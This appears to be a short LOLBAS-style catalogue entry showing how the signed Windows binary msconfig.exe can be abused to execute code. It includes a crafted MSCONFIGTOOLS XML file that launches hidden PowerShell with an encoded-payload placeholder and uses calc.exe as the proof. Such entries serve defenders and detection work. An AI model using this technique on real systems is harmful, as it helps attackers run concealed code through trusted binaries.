## Msconfig.exe

* Functions: Execute

```
Msconfig.exe -5  
 
```

Acknowledgements:
* Pierre-Alexandre Braeken - @pabraeken


Resources:
* https://twitter.com/pabraeken/status/991314564896690177

Full path:
```
c:\windows\system32\msconfig.exe
```

Notes:
* Prerequisites
add a crafted .xml in System32

```
<?xml version="1.0" ?> 
<MSCONFIGTOOLS> 
<a NAME="LOLBin" PATH="%windir%\System32\WindowsPowerShell\v1.0\powershell.exe" 
DEFAULT_OPT="-nop -sta -enc -w 1 YOURBASE64" ADV_OPT="-command calc.exe" HELP="LOLBin MSCONFIGTOOLS"/> 
</MSCONFIGTOOLS>
```
 
